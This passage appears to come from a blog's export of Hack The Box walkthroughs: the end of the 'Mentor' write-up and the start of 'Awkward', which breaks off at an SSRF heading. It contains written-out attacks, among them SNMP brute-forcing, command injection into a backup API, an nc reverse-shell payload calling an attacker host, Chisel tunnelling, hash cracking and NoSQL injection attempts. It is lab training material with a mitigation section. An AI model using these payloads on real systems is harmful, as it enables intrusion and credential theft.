&amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-25 19:48:34[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task[DATA] attacking snmp://target.htb:161/[161][snmp] host: target.htb   password: public[STATUS] attack finished for target.htb (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-25 19:48:34Eventually, I realized that it was ending too quickly. I was not giving it the -f parameter, so I did not think it was supposed to stop after it found the first match, but it did.I moved ‚Äòpublic at the end of my wordlist and tried again with SNMP versions 1 and 2.$ hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt target.htb snmp -m '2'Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-26 11:11:38[DATA] max 16 tasks per 1 server, overall 16 tasks, 3217 login tries (l:1/p:3217), ~202 tries per task[DATA] attacking snmp://target.htb:161/2[STATUS] 128.00 tries/min, 128 tries in 00:01h, 3089 to do in 00:25h, 16 active[STATUS] 122.67 tries/min, 368 tries in 00:03h, 2849 to do in 00:24h, 16 active[STATUS] 121.00 tries/min, 847 tries in 00:07h, 2370 to do in 00:20h, 16 active        [161][snmp] host: target.htb   password: internal[STATUS] attack finished for target.htb (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-26 11:23:28It found ‚Äòinternal‚Äô. I scanned this.$ snmpbulkwalk -v 2c -c internal target . &gt; snmp.txt...HOST-RESOURCES-MIB::hrSWRunParameters.1991 = STRING: \"-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80\"HOST-RESOURCES-MIB::hrSWRunParameters.2006 = STRING: \"-namespace moby -id 42602c871adeb563d57151cd342480f8a7f3cd30928eef2b1bee26105a2cec4f -address /run/containerd/containerd.sock\"HOST-RESOURCES-MIB::hrSWRunParameters.2026 = STRING: \"main.py\"HOST-RESOURCES-MIB::hrSWRunParameters.2044 = STRING: \"-c from multiprocessing.semaphore_tracker import main;main(4)\"HOST-RESOURCES-MIB::hrSWRunParameters.2045 = STRING: \"-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork\"HOST-RESOURCES-MIB::hrSWRunParameters.2085 = \"\"HOST-RESOURCES-MIB::hrSWRunParameters.2087 = \"\"HOST-RESOURCES-MIB::hrSWRunParameters.2112 = STRING: \"/usr/local/bin/login.py REDACTED\"HOST-RESOURCES-MIB::hrSWRunParameters.2279 = \"\"HOST-RESOURCES-MIB::hrSWRunParameters.2347 = \"\"HOST-RESOURCES-MIB::hrSWRunParameters.2348 = \"\"HOST-RESOURCES-MIB::hrSWRunParameters.2454 = \"\"HOST-RESOURCES-MIB::hrSWRunParameters.2486 = \"\"HOST-RESOURCES-MIB::hrSWRunParameters.2530 = \"\"...It found a script running on the server, with what looked like a password in the command line.I used the password to connect as james.POST /auth/login HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-Length: 100{  \"email\": \"james@mentorquotes.htb\",  \"username\": \"james\",  \"password\": \"REDACTED\"}It worked.HTTP/1.1 200 OKDate: Sun, 26 Feb 2023 16:29:18 GMTServer: uvicorncontent-length: 154content-type: application/jsonKeep-Alive: timeout=5, max=100Connection: Keep-Alive\"JWT\"I used the returned JWT to try the requests that were rejected earlier.GET /users/ HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheAuthorization: JWTI was able to extract users.HTTP/1.1 201 CreatedDate: Sun, 26 Feb 2023 16:36:25 GMTServer: uvicorncontent-length: 305content-type: application/jsonConnection: close[{\"id\":1,\"email\":\"james@mentorquotes.htb\",\"username\":\"james\"},{\"id\":2,\"email\":\"svc@mentorquotes.htb\",\"username\":\"service_acc\"},{\"id\":4,\"email\":\"admin@mentorquotes.htb\",\"username\":\"admin\"},{\"id\":5,\"email\":\"admin@mentorquotes.htb\",\"username\":\"james\"},{\"id\":6,\"email\":\"user@example.com\",\"username\":\"string\"}]I tried creating quotes with Server Side Template Injection (SSTI) payloads.POST /quotes/ HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-type: application/jsonAuthorization: JWTContent-Length: 125{\"title\":  \"{{7*7}}${7*7}&lt;%= 7*7 %&gt;${{7*7}}#{7*7}*{7*7}\",\"description\":  \"{{7*7}}${7*7}&lt;%= 7*7 %&gt;${{7*7}}#{7*7}*{7*7}\"}The payload was accepted and reflected in the response, but not executed. I looked at the first website. The new quote was there, but again not executed.Admin APII remembered the undocumented admin endpoint found by Feroxbuster. I tried it again with james‚Äô JWT.GET /admin/ HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheAuthorization: JWTHTTP/1.1 200 OKDate: Sun, 26 Feb 2023 16:37:07 GMTServer: uvicorncontent-length: 83content-type: application/jsonConnection: close{\"admin_funcs\":{\"check db connection\":\"/check\",\"backup the application\":\"/backup\"}}It showed 2 additional endpoints. I tried ‚Äò/admin/check‚Äô, the response said that it was not implemented yet.I tried the ‚Äò/admin/backup‚Äô endpoint. It required a path.POST /admin/backup HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-type: application/jsonAuthorization: JWTContent-Length: 27{\"path\": \"/etc/passwd\"}HTTP/1.1 200 OKDate: Fri, 03 Mar 2023 12:43:17 GMTServer: uvicorncontent-length: 16content-type: application/jsonConnection: close{\"INFO\":\"Done!\"}I thought this might be creating backups through some command line, so I tried to get code execution.POST /admin/backup HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-type: application/jsonAuthorization: JWTContent-Length: 44{\"path\": \"/etc/passwd; wget 10.10.14.8\"}It worked, but the backup file name was appended at the end of my command.$ python -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.193 - - [03/Mar/2023 07:45:05] code 404, message File not found10.10.11.193 - - [03/Mar/2023 07:45:05] \"GET /app_backkup.tar HTTP/1.1\" 404 -I added a semicolon and a ‚Äò#‚Äô to comment out the rest of the command.{\"path\": \"/etc/passwd; wget 10.10.14.8 ; #\"}This time it requested only what I asked.10.10.11.193 - - [03/Mar/2023 07:47:19] \"GET / HTTP/1.1\" 200 -I knew I could get code execution. I tried my usual reverse shell, but it failed. Bash was not installed on the server. I tried a different reverse shell using sh.POST /admin/backup HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Authorization: JWT{\"path\": \"; mkfifo /tmp/aaaa; nc 10.10.14.11 4444 0&lt;/tmp/aaaa | /bin/sh &gt;/tmp/aaaa 2&gt;&amp;1; rm /tmp/aaaa; #\"}This one worked.$ nc -klvnp 4444listening on [any] 4444 ...connect to [10.10.14.11] from (UNKNOWN) [10.10.11.193] 35401whoamirootpwd/apphostnamea6fe36f9a4e5cd /home/svclsuser.txtcat user.txtREDACTEDUser svcI was in a Docker container. I found some database credentials in the website code, in ‚Äò/app/app/db.py‚Äô.import osfrom sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)from sqlalchemy.sql import funcfrom databases import Database# Database url if none is passed the default one is usedDATABASE_URL = os.getenv(\"DATABASE_URL\", \"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\")# SQLAlchemy for quotesengine = create_engine(DATABASE_URL)...I could not connect to the database from the container, it did not have any Postgres client installed. I used Chisel to create a tunnel between the container and my Kali VM so I could connect to the database from my machine.I started a Chisel server on my machine../chisel server -p 3477 --reverseThen I downloaded Chisel in the container and launched it. I ran it as a client to send traffic on port 5432 on my machine to the same port on the database server.wget 10.10.14.11/chiselConnecting to 10.10.14.11 (10.10.14.11:80)chisel               100% |********************************| 8188k  0:00:00 ETAchmod +x chisel./chisel client 10.10.14.11:3477 R:5432:172.22.0.1:5432/tcpBack on my machine, I connected to Postgres through the reverse tunnel.psql postgresql://postgres:postgres@localhost/mentorquotes_dbThen I looked at what the database contained.mentorquotes_db=# \\dt          List of relations Schema |   Name   | Type  |  Owner--------+----------+-------+---------- public | cmd_exec | table | postgres public | quotes   | table | postgres public | users    | table | postgres(3 rows)mentorquotes_db=# Select * From cmd_exec;                               cmd_output------------------------------------------------------------------------ uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)(1 row)mentorquotes_db=# Select * From users; id |         email          |  username   |             password----+------------------------+-------------+----------------------------------  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8(2 rows)I already knew james‚Äô password. I used Hashcat to crack the password for svc.$ cat hash.txt53f22d0dfa10dce7e29cd31f4f953fd8$ hashcat -a0 -m0 hash.txt /usr/share/seclists/rockyou.txthashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==================================================================================================================================================* Device #1: pthread-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2868/5801 MB (1024 MB allocatable), 6MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Hash* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 1 MBDictionary cache hit:* Filename..: /usr/share/seclists/rockyou.txt* Passwords.: 14344384* Bytes.....: 139921497* Keyspace..: 1434438453f22d0dfa10dce7e29cd31f4f953fd8:REDACTEDSession..........: hashcatStatus...........: CrackedHash.Mode........: 0 (MD5)Hash.Target......: 53f22d0dfa10dce7e29cd31f4f953fd8Time.Started.....: Sun Feb 26 15:31:07 2023 (2 secs)Time.Estimated...: Sun Feb 26 15:31:09 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/seclists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:  6440.5 kH/s (0.12ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 13326336/14344384 (92.90%)Rejected.........: 0/13326336 (0.00%)Restore.Point....: 13323264/14344384 (92.88%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: 123qwe1q -&gt; 123kof321Hardware.Mon.#1..: Util: 31%Started: Sun Feb 26 15:30:55 2023Stopped: Sun Feb 26 15:31:10 2023The password was cracked in a few seconds. I used it to ssh to the server as svc.$ ssh svc@targetsvc@target's password:Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sun Feb 26 08:32:32 PM UTC 2023  System load:                      0.00439453125...The list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Mon Dec 12 10:22:58 2022 from 10.10.14.40svc@mentor:~$ User jamesThis one took me a lot of time to get. I started by looking at the common things. I could not run sudo, and did not find any interesting suid binaries. I also check for files with capabilities, but again nothing.I checked for cronjobs.svc@mentor:~$ crontab -l# Edit this file to introduce tasks to be run by cron.## Each task to run has to be defined through a single line# indicating with different fields when the task will be run# and what command to run for the task## To define the time you can provide concrete values for# minute (m), hour (h), day of month (dom), month (mon),# and day of week (dow) or use '*' in these fields (for 'any').## Notice that tasks will be started based on the cron's system# daemon's notion of time and timezones.## Output of the crontab jobs (including errors) is sent through# email to the user the crontab file belongs to (unless redirected).## For example, you can run a backup of all your user accounts# at 5 a.m every week with:# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/## For more information see the manual pages of crontab(5) and cron(8)## m h  dom mon dow   command# 10 * * * *  sleep 30; /usr/local/bin/login.py 'kj23sadkj123as0-d213'There was a commented-out cronjobs. This was the command I saw in SNMP that gave me the password to use in the API. I retried the password as james and root. It failed.I checked the script content.#!/usr/bin/python3import requests, timeimport sys, osuser = 'james'passw = sys.argv[1]json_data = {    'email': f'{user}@mentorquotes.htb',    'username': user,    'password': passw,}while True:        response = requests.post('http://172.22.0.1:8000/auth/login', json=json_data)        if 'Not authorized!' in response:                os.system(f\"echo [{time.asctime()}] FAILED LOGIN! &gt;&gt; /root/logins.log\")        time.sleep(20)The code was writting to a file in ‚Äò/root‚Äô. That looked really promising, maybe it was being run as root. I was able to write to it, so I added a line to create a file in ‚Äò/tmp‚Äô. I also ran pspy to find out if I could see it executed. It was not.I ran linPEAS on the server and did not see anything in the results. I tried to find modified files all over the file system.Eventually, I looked at the configuration for the running services. The Apache and sshd configuration had nothing special. But when I got to the SNMP configuration, I finally saw it.svc@mentor:~$ cat /etc/snmp/snmpd.conf...createUser bootstrap MD5 REDACTED DESrouser bootstrap priv...I contained a password. I used it to ‚Äòsu‚Äô as james.svc@mentor:~$ su jamesPassword:james@mentor:/home/svc$ rootOnce connected as james, getting root was very easy.james@mentor:/home/svc$ sudo -l[sudo] password for james:Matching Defaults entries for james on mentor:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser james may run the following commands on mentor:    (ALL) /bin/shjames@mentor:~$ sudo /bin/sh# cat /root/root.txtREDACTEDMitigationThe biggest issue with that box is the passwords. There are passwords all over, and they are reused. There is a password used on the command line that allowed me to connect to the API. The password that svc uses for the API is the same one they use to connect to the server. That password is also hashed using a very weak algorithm (MD5). It took hashcat 15 seconds to crack it in an underprovisioned VM. And james‚Äô password was in clear in a configuration file that anyone could read. This user had permission to do anything they wanted on the server. Their password should have been a lot stronger than what they used, and it should never appear anywhere on the server.I do not know much about SNMP. I never used it. But a quick search tells me that only SNMPv3 should be used as it allows authentication and encrypting of the payloads. Also, it probably should not be accessible to unknown machines on the net.The code used by the backup API did have any protection against command injection. It took user input and directly inserted it into a shell command.# Take a backup of the application@router.post(\"/backup\",dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)async def backup(payload: backup):    os.system(f'tar -c -f {str(payload.path)}/app_backkup.tar {str(WORK_DIR)}')    return {\"INFO\": \"Done!\"}There was no validation of the ‚Äòpath‚Äô variable. Using subprocess would have helped prevent command injection. But a better solution would have been to not use input from the user. Why allow them to write backups anywhere they want?"
  },
  
  {
    "title": "Hack The Box Walkthrough - Awkward",
    "url": "/posts/HackTheBox-Walkthrough-Awkward/",
    "categories": "",
    "tags": "Walkthrough, Hacking, HackTheBox, Medium, Machine",
    "date": "2023-02-25 00:00:00 +0800",
    





    
    "snippet": "This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user‚Äôs password in an notes file, then exploit the same application a second time to get r...",
    "content": "This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user‚Äôs password in an notes file, then exploit the same application a second time to get root.  Room: Awkward  Difficulty: Medium  URL: https://app.hackthebox.com/machines/Awkward  Author: coopertim13EnumerationI started by enumerating open ports with rustscan.$ rustscan -a target -- -A  | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------Real hackers hack time ‚åõ[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.10.11.185:22Open 10.10.11.185:80[~] Starting Script(s)[&gt;] Script to be run Some(\"nmap -vvv -p  \")[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 19:26 ESTNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 19:26Completed NSE at 19:26, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 19:26Completed NSE at 19:26, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 19:26Completed NSE at 19:26, 0.00s elapsedInitiating Ping Scan at 19:26Scanning 10.10.11.185 [2 ports]Completed Ping Scan at 19:26, 0.05s elapsed (1 total hosts)Initiating Connect Scan at 19:26Scanning target (10.10.11.185) [2 ports]Discovered open port 80/tcp on 10.10.11.185Discovered open port 22/tcp on 10.10.11.185Completed Connect Scan at 19:26, 0.02s elapsed (2 total ports)Initiating Service scan at 19:26Scanning 2 services on target (10.10.11.185)Completed Service scan at 19:26, 6.08s elapsed (2 services on 1 host)NSE: Script scanning 10.10.11.185.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 19:26Completed NSE at 19:26, 0.99s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 19:26Completed NSE at 19:26, 0.10s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 19:26Completed NSE at 19:26, 0.00s elapsedNmap scan report for target (10.10.11.185)Host is up, received syn-ack (0.042s latency).Scanned at 2023-01-07 19:26:23 EST for 7sPORT   STATE SERVICE REASON  VERSION22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCMaN1wQtPg5uk2w3xD0d0ND6JQgzw40PoqCSBDGB7Q0/f5lQSGU2eSTw4uCdL99hdM/+Uv84ffp2tNkCXyV8l8=|   256 59365bba3c7821e326b37d23605aec38 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFsq9sSC1uhq5CBWylh+yiC7jz4tuegMj/4FVTp6bzZy80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)| http-methods:|_  Supported Methods: GET HEAD|_http-title: Site doesn't have a title (text/html).|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 19:26Completed NSE at 19:26, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 19:26Completed NSE at 19:26, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 19:26Completed NSE at 19:26, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.67 secondsThere were two open ports, 22 (SSH) and 80 (HTTP).The website was redirecting to http://hat-valley.htb/, I added the domain to my hosts file. I scanned the site with Feroxbuster. But it did not find anything useful.I used wfuzz to look for subdomains.$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 13 -H \"Host:FUZZ.hat-valley.htb\" \"http://hat-valley.htb/\" /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. /home/ehogue/.local/lib/python3.10/site-packages/requests/__init__.py:87: RequestsDependencyWarning:urllib3 (1.26.5) or chardet (5.1.0) doesn't match a supported version!********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://hat-valley.htb/Total requests: 648201=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================000501986:   401        7 L      12 W       188 Ch      \"store\"Total time: 0Processed Requests: 648201Filtered Requests: 648200Requests/sec.: 0There was one subdomain: store.hat-valley.htb. I added it to my hosts file and scanned the site with Feroxbuster. It did not find anything. I tried looking at the site, but it required authentication.Main SiteI looked around the site. There were a few employee profiles. I noted their name in case I could use them as usernames later. There was a form on the bottom, but it did not do anything when I posted it.I looked at the JavaScript code, it had the Source Maps. I opened the Firefox Developers tools to look at it.I opened the router‚Äôs code and saw that the site was exposing four routes.const routes = [  {    path: \"/\",    name: \"base\",    component: Base,  },  {    path: \"/hr\",    name: \"hr\",    component: HR,  },  {    path: \"/dashboard\",    name: \"dashboard\",    component: Dashboard,    meta: {      requiresAuth: true    }  },  {    path: \"/leave\",    name: \"leave\",    component: Leave,    meta: {      requiresAuth: true    }  }];const router = createRouter({  history: createWebHistory(),  routes,});router.beforeEach((to, from, next) =&gt; {  if((to.name == 'leave' || to.name == 'dashboard') &amp;&amp; VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login    next({ name: 'hr' })  }  else if(to.name == 'hr' &amp;&amp; VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard    next({ name: 'dashboard' })  }  else {    next()  }})export default router;The dashboard and leave endpoints needed a token cookie. If it was set to anything other than ‚Äòguest‚Äô, the page would be rendered. I changed my cookie to ‚Äòadmin‚Äô and loaded the dashboard page.The page loaded. Same with the page to send leave requests.But posting a request failed.JsonWebTokenError: jwt malformed&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /var/www/hat-valley.htb/server/server.js:62:30&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15&lt;br&gt; &amp;nbsp; &amp;nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)&lt;br&gt; &amp;nbsp; &amp;nbsp;at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)My cookie was invalid. It was expecting a JWT. I tried forging one with the none algorithm. Especially since I know about a recent vulnerability in the library it used. But that failed.The login attempts were posted to /api/login.POST /api/login HTTP/1.1Host: hat-valley.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: application/json, text/plain, */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 39Origin: http://hat-valley.htbConnection: closeReferer: http://hat-valley.htb/hrCookie: token=guest{\"username\":\"admin\",\"password\":\"admin\"}I tried sending some SQL injections without any results.I tried NoSQL injection in the username.POST /api/login HTTP/1.1Host: hat-valley.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: application/json, text/plain, */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 40Origin: http://hat-valley.htbConnection: closeReferer: http://hat-valley.htb/hrCookie: token=guest{\"username\":{\"$ne\":\"\"},\"password\":\"'\"}HTTP/1.1 401 UnauthorizedServer: nginx/1.18.0 (Ubuntu)Date: Fri, 13 Jan 2023 14:47:05 GMTContent-Type: text/html; charset=utf-8Content-Length: 30Connection: closex-powered-by: Expressaccess-control-allow-origin: *etag: W/\"1e-rLNS954LHEEL+kNUFi+s5vEu3/o\"Incorrect username or passwordIt didn‚Äôt do anything. I tried in the password.POST /api/login HTTP/1.1Host: hat-valley.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: application/json, text/plain, */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 49Origin: http://hat-valley.htbConnection: closeReferer: http://hat-valley.htb/hrCookie: token=guest{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}It gave me an error. But it did not appear to be used in a database query. It was probably trying to hash the password to validate it. But that hinted that the types of the data were not checked.HTTP/1.1 500 Internal Server ErrorServer: nginx/1.18.0 (Ubuntu)Date: Fri, 13 Jan 2023 14:47:21 GMTContent-Type: text/html; charset=utf-8Content-Length: 1247Connection: closex-powered-by: Expressaccess-control-allow-origin: *content-security-policy: default-src 'none'x-content-type-options: nosniff&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received an instance of Object&lt;br&gt; &amp;nbsp; &amp;nbsp;at Function.from (buffer.js:330:9)&lt;br&gt; &amp;nbsp; &amp;nbsp;at new Buffer (buffer.js:286:17)&lt;br&gt; &amp;nbsp; &amp;nbsp;at module.exports (/var/www/hat-valley.htb/node_modules/sha256/lib/nodecrypto.js:14:12)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /var/www/hat-valley.htb/server/server.js:30:76&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15&lt;br&gt; &amp;nbsp; &amp;nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;APIsI looked at the various API calls the application was making. I looked in the services folder in the application code.  /api/all-leave - Get the leave requests  /api/submit-leave - Create a leave request  /api/login - Login to the application  /api/staff-details - Get information about the staff  /api/store-status - Verify if the store is onlineMost the calls were failing because of my bad JWT. I tried forging one again, but I failed.Server-Side Request Forgery (SSRF)The store status API calls were not failing with my 